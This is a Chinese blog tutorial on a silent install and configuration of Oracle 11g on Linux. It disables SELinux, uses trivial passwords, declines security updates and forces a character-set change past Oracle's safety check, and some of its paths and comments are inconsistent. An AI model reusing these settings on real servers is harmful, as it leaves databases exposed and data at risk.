<p>安装文档<a href="http://docs.oracle.com/cd/E11882_01/install.112/e24326/toc.htm" target="_blank" rel="external">http://docs.oracle.com/cd/E11882_01/install.112/e24326/toc.htm</a><br>错误文档<a href="http://docs.oracle.com/cd/E11882_01/server.112/e17766/toc.htm#BEGIN" target="_blank" rel="external">http://docs.oracle.com/cd/E11882_01/server.112/e17766/toc.htm#BEGIN</a></p>
<h2 id="一、使用oracle硬件要求"><a href="#一、使用oracle硬件要求" class="headerlink" title="一、使用oracle硬件要求"></a>一、使用oracle硬件要求</h2><p>1、内存要求<br>最小内存1G，推荐2G或2G以上<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">free</span> -m  <span class="comment">#查看内存和swap空间  </span></div></pre></td></tr></table></figure></p>
<p>2、swap大小设定<br>1GB跟2GB物理内存之间的，设定swap大小为物理内存的1.5倍<br>2GB跟16GB物理内存之间的，设置swap大小与物理内存相等<br>16GB物理内存以上的，设置swap大小为16GB  </p>
<p>增加swap空间的方法<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">①dd <span class="keyword">if</span>=<span class="regexp">/dev/</span>zero of=<span class="regexp">/mnt/</span>swap bs=<span class="number">1</span>M <span class="keyword">count</span>=<span class="number">2048</span>  </div><div class="line">②mkswap <span class="regexp">/mnt/</span>swap  </div><div class="line">③swapon <span class="regexp">/mnt/</span>swap  </div><div class="line">④如果在<span class="regexp">/etc/</span>rc.local中有swapoff -a 需要修改为swapon -a   </div><div class="line">⑤需要修改文件<span class="regexp">/etc/</span>fstab中的swap行。  </div><div class="line">  添加 <span class="regexp">/mnt/</span>swap swap swap defaults <span class="number">0</span> <span class="number">0</span>  </div></pre></td></tr></table></figure></p>
<p>3、共享内存/dev/shm要求<br>至少比在每个oracle实例中的MEMORY_MAX_TARGET和MEMORY_TARGET要大。  </p>
<p>4、/tmp空间大小要求<br>至少1GB空间  </p>
<p>5、硬盘大小要求<br>存放oracle软件文件和数据文件的空间至少6GB<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">df -hT</span></div></pre></td></tr></table></figure></p>
<p>备注:<br>保证selinux关闭<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">su - root</div><div class="line">setenforce <span class="number">0</span> 不需要重启</div><div class="line">修改/etc/selinux/<span class="built_in">config</span>文件中的SELINUX=<span class="string">""</span> 为 disabled ，需要重启</div></pre></td></tr></table></figure></p>
<p>所需端口打开 1521<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-id">#iptables</span> -I INPUT <span class="number">4</span> -<span class="selector-tag">p</span> tcp -m state --state NEW -m tcp --dport <span class="number">1521</span> -j ACCEPT #允许 <span class="number">1521</span> 端口</div><div class="line"><span class="selector-id">#service</span> iptables save #保存 iptables 规则</div></pre></td></tr></table></figure></p>
<h2 id="二、安装依赖包"><a href="#二、安装依赖包" class="headerlink" title="二、安装依赖包"></a>二、安装依赖包</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">yum update</div><div class="line">yum -y install binutils compat-libstdc++-<span class="number">33</span> compat-libstdc++-<span class="number">33</span><span class="selector-class">.i686</span> elfutils-libelf elfutils-libelf-devel gcc gcc-c++ glibc glibc<span class="selector-class">.i686</span> glibc-common glibc-devel glibc-devel<span class="selector-class">.i686</span> glibc-headers ksh libaio libaio<span class="selector-class">.i686</span> libaio-devel libaio-devel<span class="selector-class">.i686</span> libgcc   libgcc<span class="selector-class">.i686</span> libstdc++ libstdc++<span class="selector-class">.i686</span> libstdc++-devel make sysstat unixODBC unixODBC-devel wget unzip</div><div class="line">yum clean all</div></pre></td></tr></table></figure>
<h2 id="三、修改hostname"><a href="#三、修改hostname" class="headerlink" title="三、修改hostname"></a>三、修改hostname</h2><p>两个文件里的hostname要保持一致<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">vim <span class="meta-keyword">/etc/</span>sysconfig/network</div><div class="line">vim <span class="meta-keyword">/etc/</span>hosts</div><div class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> localhost  </div><div class="line"> <span class="meta"># ::1  localhost localhost.localdomain localhost6 localhost6.localdomain6  </span></div><div class="line">IP Kevin  </div></pre></td></tr></table></figure></p>
<h2 id="四、创建所需的操作系统组和用户"><a href="#四、创建所需的操作系统组和用户" class="headerlink" title="四、创建所需的操作系统组和用户"></a>四、创建所需的操作系统组和用户</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">groupadd oinstall</div><div class="line">groupadd dba</div><div class="line">useradd -g oinstall -G dba <span class="keyword">oracle</span></div><div class="line">设置<span class="keyword">oracle用户密码</span></div><div class="line">passwd <span class="keyword">oracle </span>(建议使用<span class="keyword">oracle)</span></div></pre></td></tr></table></figure>
<h2 id="五、修改内核参数"><a href="#五、修改内核参数" class="headerlink" title="五、修改内核参数"></a>五、修改内核参数</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">vi /etc/sysctl<span class="selector-class">.conf</span></div><div class="line"></div><div class="line">fs<span class="selector-class">.aio-max-nr</span> = <span class="number">1048576</span></div><div class="line">fs<span class="selector-class">.file-max</span> = <span class="number">6815744</span></div><div class="line">kernel<span class="selector-class">.shmall</span> = <span class="number">2097152</span></div><div class="line">kernel<span class="selector-class">.shmmax</span> = <span class="number">536870912</span></div><div class="line">kernel<span class="selector-class">.shmmni</span> = <span class="number">4096</span></div><div class="line">kernel<span class="selector-class">.sem</span> = <span class="number">250</span> <span class="number">32000</span> <span class="number">100</span> <span class="number">128</span></div><div class="line">net<span class="selector-class">.ipv4</span><span class="selector-class">.ip_local_port_range</span> = <span class="number">9000</span> <span class="number">65500</span></div><div class="line">net<span class="selector-class">.core</span><span class="selector-class">.rmem_default</span> = <span class="number">262144</span></div><div class="line">net<span class="selector-class">.core</span><span class="selector-class">.rmem_max</span> = <span class="number">4194304</span></div><div class="line">net<span class="selector-class">.core</span><span class="selector-class">.wmem_default</span> = <span class="number">262144</span></div><div class="line">net<span class="selector-class">.core</span><span class="selector-class">.wmem_max</span> = <span class="number">1048576</span></div><div class="line"></div><div class="line">/sbin/sysctl -<span class="selector-tag">p</span> </div></pre></td></tr></table></figure>
<h2 id="六、修改用户限制"><a href="#六、修改用户限制" class="headerlink" title="六、修改用户限制"></a>六、修改用户限制</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">vi /etc/security/limits.conf</div><div class="line"></div><div class="line">oracle soft nproc <span class="number">2047</span></div><div class="line">oracle hard nproc <span class="number">16384</span></div><div class="line">oracle soft nofile <span class="number">1024</span></div><div class="line">oracle hard nofile <span class="number">65536</span></div><div class="line">oracle soft stack  <span class="number">10240</span></div><div class="line"></div><div class="line">vi /etc/pam.d/login</div><div class="line"></div><div class="line">session required /<span class="class"><span class="keyword">lib</span>/<span class="title">security</span>/<span class="title">pam_limits</span>.<span class="title">so</span></span></div><div class="line">session required pam_limits.so</div><div class="line"></div><div class="line">vi /etc/profile</div><div class="line"></div><div class="line"><span class="keyword">if</span> [ $USER = <span class="string">"oracle"</span> ]; <span class="keyword">then</span></div><div class="line"><span class="keyword">if</span> [ $SHELL = <span class="string">"/bin/ksh"</span> ]; <span class="keyword">then</span></div><div class="line">ulimit -p <span class="number">16384</span></div><div class="line">ulimit -n <span class="number">65536</span></div><div class="line"><span class="keyword">else</span></div><div class="line">ulimit -u <span class="number">16384</span> -n <span class="number">65536</span></div><div class="line">fi</div><div class="line">fi</div><div class="line"></div><div class="line">source /etc/profile</div></pre></td></tr></table></figure>
<h2 id="七、创建安装目录"><a href="#七、创建安装目录" class="headerlink" title="七、创建安装目录"></a>七、创建安装目录</h2><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="title">mkdir</span> -p /<span class="class"><span class="keyword">data</span>/app/oracle/</span></div><div class="line"><span class="title">chown</span> -<span class="type">R</span> oracle:oinstall /<span class="class"><span class="keyword">data</span>/app/</span></div><div class="line"><span class="title">chmod</span> -<span class="type">R</span> <span class="number">775</span> /<span class="class"><span class="keyword">data</span>/app/</span></div></pre></td></tr></table></figure>
<h2 id="八、创建-etc-oraInst-loc文件"><a href="#八、创建-etc-oraInst-loc文件" class="headerlink" title="八、创建/etc/oraInst.loc文件"></a>八、创建/etc/oraInst.loc文件</h2><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">inventory_loc=<span class="regexp">/data/</span>app<span class="regexp">/oracle/</span>oraInventory</div><div class="line">inst_group=oinstall</div><div class="line">更改文件的权限</div><div class="line">chown <span class="string">oracle:</span>oinstall <span class="regexp">/etc/</span>oraInst.loc</div><div class="line">chmod <span class="number">664</span> <span class="regexp">/etc/</span>oraInst.loc</div></pre></td></tr></table></figure>
<h2 id="九、设置oracle环境变量"><a href="#九、设置oracle环境变量" class="headerlink" title="九、设置oracle环境变量"></a>九、设置oracle环境变量</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">su - oracle </div><div class="line">vi ~/<span class="selector-class">.bash_profile</span></div><div class="line">export ORACLE_BASE=/data/app/oracle</div><div class="line">export ORACLE_SID=orcl</div><div class="line">source ~/<span class="selector-class">.bash_profile</span></div><div class="line">检查环境变量：</div><div class="line">env</div></pre></td></tr></table></figure>
<h2 id="十、解压oracle安装文件"><a href="#十、解压oracle安装文件" class="headerlink" title="十、解压oracle安装文件"></a>十、解压oracle安装文件</h2><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">wget </span><span class="built_in">--background</span> <span class="built_in">--output-document=linux.x64_11gR2_database_2of2.zip</span> <span class="string">"http://download.oracle.com/otn/linux/oracle11g/R2/linux.x64_11gR2_database_2of2.zip?AuthParam=登陆官网下载时会给一个值"</span></div></pre></td></tr></table></figure>
<p>unzip linux.x64_11gR2_database_1of2.zip<br>unzip linux.x64_11gR2_database_2of2.zip<br>解压后为一个database文件夹<br>设置权限为oracle oinstall</p>
<h2 id="十、复制响应文件模板"><a href="#十、复制响应文件模板" class="headerlink" title="十、复制响应文件模板"></a>十、复制响应文件模板</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">cp database<span class="regexp">/response/</span>* <span class="regexp">/data/</span>app<span class="regexp">/etc/</span></div><div class="line">设置响应文件权限 oracle.oinstall</div><div class="line">su - root</div><div class="line">chmod <span class="number">700</span> <span class="regexp">/data/</span>app<span class="regexp">/etc/</span>*.rsp</div></pre></td></tr></table></figure>
<h2 id="十一、静默安装Oracle软件"><a href="#十一、静默安装Oracle软件" class="headerlink" title="十一、静默安装Oracle软件"></a>十一、静默安装Oracle软件</h2><p>su - oracle<br>修改安装Oracle软件的响应文件/data/app/etc/db_install.rsp<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">oracle<span class="selector-class">.install</span><span class="selector-class">.option</span>=INSTALL_DB_SWONLY <span class="comment">//29 行 安装类型  </span></div><div class="line">ORACLE_HOSTNAME=Kevin <span class="comment">//37 行 主机名称(自己对应的主机名称,可利用hostname查看)  </span></div><div class="line">UNIX_GROUP_NAME=oinstall <span class="comment">//42 行 安装组  </span></div><div class="line">INVENTORY_LOCATION=/data/app/oracle/oraInventory <span class="comment">//47 行 INVENTORY目录 必须在ORACLE_BASE路径以外  </span></div><div class="line">SELECTED_LANGUAGES=en,zh_CN <span class="comment">//78 行 选择语言  </span></div><div class="line">ORACLE_HOME=/data/app/oracle/product/<span class="number">11.2</span>.<span class="number">0</span>/dbhome_1 <span class="comment">//83 行 oracle_home  </span></div><div class="line">ORACLE_BASE=/data/app/oracle <span class="comment">//88 行 oracle_base  </span></div><div class="line">oracle<span class="selector-class">.install</span><span class="selector-class">.db</span><span class="selector-class">.InstallEdition</span>=EE <span class="comment">//99 行 oracle版本  </span></div><div class="line">oracle<span class="selector-class">.install</span><span class="selector-class">.db</span><span class="selector-class">.isCustomInstall</span>=false <span class="comment">//108行 自定义安装  </span></div><div class="line">oracle<span class="selector-class">.install</span><span class="selector-class">.db</span><span class="selector-class">.DBA_GROUP</span>=dba <span class="comment">//142行 dba用户组  </span></div><div class="line">oracle<span class="selector-class">.install</span><span class="selector-class">.db</span><span class="selector-class">.OPER_GROUP</span>=dba <span class="comment">//147行 oper用户组  </span></div><div class="line">DECLINE_SECURITY_UPDATES=true<span class="comment">//385行 设置安全更新  </span></div></pre></td></tr></table></figure></p>
<p>进行静默安装Oracle软件<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.<span class="regexp">/runInstaller -silent -noconfig -responseFile /</span>data<span class="regexp">/app/</span>oracle<span class="regexp">/etc/</span>db_install.rsp</div></pre></td></tr></table></figure></p>
<p>出现warning 可以忽略<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">du -sh <span class="regexp">/data/</span>app<span class="regexp">/oracle/</span>product<span class="regexp">/11.2.0 查看安装进度</span></div></pre></td></tr></table></figure><br>出现类似如下提示表示安装完成：</p>
<p>#—————————————————–<br>…<br>/data/app/oracle/product/11.2.0/dbhome_1/root.sh<br>To execute the configuration scripts:</p>
<ol>
<li>Open a terminal window </li>
<li>Log in as “root” </li>
<li>Run the scripts </li>
<li>Return to this window and hit “Enter” key to continue</li>
</ol>
<p>Successfully Setup Software.</p>
<p>#—————————————————–</p>
<p>使用root用户执行root.sh<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">su root</div><div class="line">.<span class="regexp">/data/</span>app<span class="regexp">/oracle/</span>product<span class="regexp">/11.2.0/</span>dbhome_1<span class="regexp">/root.sh</span></div></pre></td></tr></table></figure></p>
<p>增加oracle环境变量<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">su - oracle</div><div class="line"> </div><div class="line">vi ~<span class="regexp">/.bash_profile</span></div><div class="line">export ORACLE_HOME=$ORACLE_BASE/product<span class="regexp">/11.2.0/dbhome</span>_1</div><div class="line">export TNS_ADMIN=$ORACLE_HOME/network/admin</div><div class="line">export PATH=.:$&#123;PATH&#125;:$HOME/<span class="symbol">bin:</span>$ORACLE_HOME/bin</div><div class="line">export PATH=$&#123;PATH&#125;:<span class="regexp">/usr/bin</span>:<span class="regexp">/bin:/usr</span><span class="regexp">/bin/</span><span class="symbol">X11:</span>/usr/local/bin</div><div class="line">export LD_LIBRARY_PATH=$&#123;LD_LIBRARY_PATH&#125;:$ORACLE_HOME/<span class="class"><span class="keyword">lib</span></span></div><div class="line">export LD_LIBRARY_PATH=$&#123;LD_LIBRARY_PATH&#125;:$ORACLE_HOME/oracm/<span class="class"><span class="keyword">lib</span></span></div><div class="line">export LD_LIBRARY_PATH=$&#123;LD_LIBRARY_PATH&#125;:<span class="regexp">/lib:/usr</span><span class="regexp">/lib:/usr</span><span class="regexp">/local/lib</span></div><div class="line">export CLASSPATH=$&#123;CLASSPATH&#125;:$ORACLE_HOME/JRE</div><div class="line">export CLASSPATH=$&#123;CLASSPATH&#125;:$ORACLE_HOME/JRE/<span class="class"><span class="keyword">lib</span></span></div><div class="line">export CLASSPATH=$&#123;CLASSPATH&#125;:$ORACLE_HOME/jlib</div><div class="line">export CLASSPATH=$&#123;CLASSPATH&#125;:$ORACLE_HOME/rdbms/jlib</div><div class="line">export CLASSPATH=$&#123;CLASSPATH&#125;:$ORACLE_HOME/network/jlib</div><div class="line">export LIBPATH=$&#123;CLASSPATH&#125;:$ORACLE_HOME/<span class="class"><span class="keyword">lib</span>:$<span class="title">ORACLE_HOME</span>/<span class="title">ctx</span>/<span class="title">lib</span></span></div><div class="line">export ORACLE_OWNER=oracle</div><div class="line">export SPFILE_PATH=$ORACLE_HOME/dbs</div><div class="line">export ORA_NLS10=$ORACLE_HOME/nls/data</div><div class="line">export DISPLAY=<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">0.0</span></div><div class="line"></div><div class="line">使设置生效</div><div class="line"> </div><div class="line">source ~<span class="regexp">/.bash_profile</span></div></pre></td></tr></table></figure></p>
<h2 id="十二、静默配置网络"><a href="#十二、静默配置网络" class="headerlink" title="十二、静默配置网络"></a>十二、静默配置网络</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">su oracle</div><div class="line"><span class="variable">$ORACLE_HOME</span><span class="regexp">/bin/</span>netca <span class="regexp">/silent /</span>responseFile <span class="regexp">/data/</span>app<span class="regexp">/etc/</span>netca.rsp</div></pre></td></tr></table></figure>
<p>启动服务<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsnrctl <span class="literal">start</span></div></pre></td></tr></table></figure><br>查看状态<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">lsnrctl status</span></div></pre></td></tr></table></figure><br>查看监听端口<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">netstat -naptlu | <span class="keyword">grep</span> <span class="number">1521</span></div><div class="line">(Not <span class="keyword">all</span> processes could <span class="keyword">be</span> identified, non-owned processinfo</div><div class="line"> will not <span class="keyword">be</span> shown,you would have <span class="keyword">to</span> <span class="keyword">be</span> root <span class="keyword">to</span> see it <span class="keyword">all</span>.)</div><div class="line">tcp        <span class="number">0</span>      <span class="number">0</span> :::<span class="number">1521</span>                     :::*                        LISTEN      <span class="number">4898</span>/tnslsnr</div></pre></td></tr></table></figure><br>执行完后, 监听就已经启动了, 默认端口是1521, 默认是动态监听, 只要实例启动了就会监听到.</p>
<h2 id="十三、静默安装数据库"><a href="#十三、静默安装数据库" class="headerlink" title="十三、静默安装数据库"></a>十三、静默安装数据库</h2><p>修改仅安装数据库的响应文件/data/oracle/etc/dbca.rsp<br><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">GDBNAME=<span class="string">"orcl.Kevin"</span> <span class="comment">//78 行 全局数据库的名字=SID+主机域名</span></div><div class="line">SID=<span class="string">"orcl"</span> <span class="comment">//149行 SID</span></div><div class="line">CHARACTERSET=<span class="string">"AL32UTF8"</span> <span class="comment">//415行 数据库字符集编码</span></div><div class="line">NATIONALCHARACTERSET=<span class="string">"UTF8"</span> <span class="comment">//425行 编码</span></div><div class="line">SYSPASSWORD=<span class="string">"sys"</span><span class="comment">//190行 密码可自己设置</span></div><div class="line">SYSTEMPASSWORD=<span class="string">"system"</span><span class="comment">//200行 密码可自己设置</span></div><div class="line"></div><div class="line">$ORACLE_HOME/bin/dbca -silent -responseFile /data/app/etc/dbca.rsp</div><div class="line"></div><div class="line">建库后监听检查</div><div class="line">lsnrctl status</div></pre></td></tr></table></figure></p>
<h2 id="十四、修改oracle启动配置文件"><a href="#十四、修改oracle启动配置文件" class="headerlink" title="十四、修改oracle启动配置文件"></a>十四、修改oracle启动配置文件</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">su - oracle</div><div class="line">vi <span class="regexp">/etc/</span>oratab</div><div class="line"> </div><div class="line">orcl:<span class="regexp">/data/</span>app<span class="regexp">/oracle/</span>product<span class="regexp">/11.2.0/</span>dbhome_1:Y <span class="regexp">//</span>把“N”改成“Y”</div><div class="line"> </div><div class="line">dbstart <span class="variable">$ORACLE_HOME</span> <span class="regexp">//</span>启动此实例，监听器</div><div class="line"> </div><div class="line">dbshut <span class="variable">$ORACLE_HOME</span>  <span class="regexp">//</span>启动此实例，监听器</div></pre></td></tr></table></figure>
<h2 id="十五、登陆sqlplus"><a href="#十五、登陆sqlplus" class="headerlink" title="十五、登陆sqlplus"></a>十五、登陆sqlplus</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">sqlplus</div><div class="line">sys as sysdba</div><div class="line">password</div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> dba_users //测试</div><div class="line"><span class="keyword">alter</span> <span class="keyword">user</span> scott <span class="keyword">account</span> <span class="keyword">unlock</span>;</div><div class="line">conn scott/password</div></pre></td></tr></table></figure>
<h2 id="十六、配置监听"><a href="#十六、配置监听" class="headerlink" title="十六、配置监听"></a>十六、配置监听</h2><p>需要远程访问<br>oracle账户下，修改监听文件 /data/app/oracle/product/11.2.0/dbhome_1/network/admin/listener.ora<br>HOST=”IP” //第8行，HOST默认是主机名，改为本机的ip地址<br>然后增加以下内容：<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">SID_LIST_LISTENER =</div><div class="line">          (<span class="name">SID_LIST</span> =</div><div class="line">          (<span class="name">SID_DESC</span> =</div><div class="line">            (<span class="name">SID_NAME</span> = orcl)</div><div class="line">            (<span class="name">ORACLE_HOME</span> = /data/app/oracle/product/11.<span class="number">2.0</span>/dbhome_1)</div><div class="line">            (<span class="name">PROGRAM</span> = extproc)</div><div class="line">          )</div><div class="line">          (<span class="name">SID_DESC</span> =</div><div class="line">            (<span class="name">GLOBAL_DBANAME</span> = orcl)</div><div class="line">            (<span class="name">ORACLE_HOME</span> = /data/app/oracle/product/11.<span class="number">2.0</span>/dbhome_1)</div><div class="line">            (<span class="name">SID_NAME</span> = orcl)</div><div class="line">          )</div><div class="line">        )</div></pre></td></tr></table></figure></p>
<p>oracle账户下，继续修改文件/data/app/oracle/product/11.2.0/dbhome_1/network/admin/tnsnames.ora<br>HOST=”你的IP” // 第六行，同上将HOST主机名该为本机的IP地址<br>具体查看listener.ora和tnsnames.ora两个文件。</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">lsnrctl <span class="literal">stop</span></div><div class="line">lsnrctl <span class="literal">start</span></div></pre></td></tr></table></figure>
<h2 id="十七、字符集的统一"><a href="#十七、字符集的统一" class="headerlink" title="十七、字符集的统一"></a>十七、字符集的统一</h2><p>涉及三方面的字符集，</p>
<ol>
<li>oracel server端的字符集;</li>
<li>oracle client端的字符集;</li>
<li>dmp文件的字符集。<br>在做数据导入的时候，需要这三个字符集都一致才能正确导入。<figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">oracle下export NLS_LANG=<span class="string">"AMERICAN_AMERICA.ZHS16GBK"</span></div><div class="line"></div><div class="line">SQL&gt; conn /as sysdba </div><div class="line">Connected. </div><div class="line">SQ<span class="class">L&gt; shutdown immediate;</span></div><div class="line">Database closed.</div><div class="line">Database dismounted.</div><div class="line">ORACLE<span class="built_in"> instance </span>shut down.</div><div class="line">SQL&gt; startup mount</div><div class="line">ORACLE<span class="built_in"> instance </span>started.</div><div class="line">Total System Global Area  413372416 bytes</div><div class="line">Fixed Size		    2213896 bytes</div><div class="line">Variable Size		  281020408 bytes</div><div class="line">Database Buffers	  125829120 bytes</div><div class="line">Redo Buffers		    4308992 bytes</div><div class="line">Database mounted.</div><div class="line">SQ<span class="class">L&gt; ALTER SYSTEM ENABLE RESTRICTED SESSION;</span> </div><div class="line">System altered. </div><div class="line">SQ<span class="class">L&gt; ALTER SYSTEM SET JOB_QUEUE_PROCESSES=0;</span> </div><div class="line">System altered. </div><div class="line">SQ<span class="class">L&gt; ALTER SYSTEM SET AQ_TM_PROCESSES=0;</span> </div><div class="line">System altered. </div><div class="line">SQ<span class="class">L&gt; alter database open;</span> </div><div class="line">Database altered. </div><div class="line">SQ<span class="class">L&gt; ALTER DATABASE CHARACTER SET ZHS16GBK;</span> </div><div class="line">ALTER DATABASE CHARACTER SET ZHS16GBK </div><div class="line">* </div><div class="line">ERROR at line 1: </div><div class="line">ORA-12712:<span class="built_in"> new </span>character set must be a superset of old character set </div><div class="line"></div><div class="line">提示我们的字符集：新字符集必须为旧字符集的超集，这时我们可以跳过超集的检查做更改： </div><div class="line">SQ<span class="class">L&gt; ALTER DATABASE character set INTERNAL_USE ZHS16GBK;</span> </div><div class="line">Database altered. </div><div class="line">SQ<span class="class">L&gt; select * from v$nls_parameters;</span> </div><div class="line">略 </div><div class="line">19 rows selected. </div><div class="line">重启检查是否更改完成： </div><div class="line">SQ<span class="class">L&gt; shutdown immediate;</span> </div><div class="line">Database closed. </div><div class="line">Database dismounted. </div><div class="line">ORACLE<span class="built_in"> instance </span>shut down. </div><div class="line">SQL&gt; startup </div><div class="line">ORACLE<span class="built_in"> instance </span>started. </div><div class="line">Total System Global Area  236000356 bytes </div><div class="line">Fixed Size                   451684 bytes </div><div class="line">Variable Size             201326592 bytes </div><div class="line">Database Buffers           33554432 bytes </div><div class="line">Redo Buffers                 667648 bytes </div><div class="line">Database mounted. </div><div class="line">Database opened. </div><div class="line">SQ<span class="class">L&gt; select * from v$nls_parameters;</span> </div><div class="line">略 </div><div class="line">19 rows selected. </div></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> database </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Oracle </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[阿里云服务器下的Linux配置]]></title>
      <url>/2016/04/25/Linux/%E9%98%BF%E9%87%8C%E4%BA%91/</url>
